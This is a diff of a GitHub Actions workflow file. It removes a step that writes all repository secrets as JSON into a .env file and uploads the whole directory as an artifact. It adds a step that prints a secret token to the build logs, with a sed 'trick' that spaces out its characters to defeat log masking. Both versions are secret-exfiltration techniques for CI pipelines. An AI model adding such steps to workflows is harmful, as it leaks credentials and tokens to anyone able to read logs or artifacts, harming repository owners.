@@ -15,14 +15,9 @@ jobs:
     runs-on: ubuntu-latest
 
     steps:
-      - name: Make envfile
-        uses: SpicyPizza/create-envfile@v2.0
-        with:
-          envkey_SECRETS: ${{ toJSON(secrets) }}
-          file_name: .env
-          fail_on_empty: false
-      - name: Upload artifact
-        uses: actions/upload-artifact@v3
-        with:
-          name: cats
-          path: .
+      - name: Step 1 - Echo out a GitHub Actions Secret to the logs
+        run: |
+            echo "The GitHub Action Secret will be masked:  "
+            echo ${{ secrets.SECRET_TOKEN }}
+            echo "Trick to echo GitHub Actions Secret:  "
+            echo ${{secrets.SECRET_TOKEN}} | sed 's/./& /g'
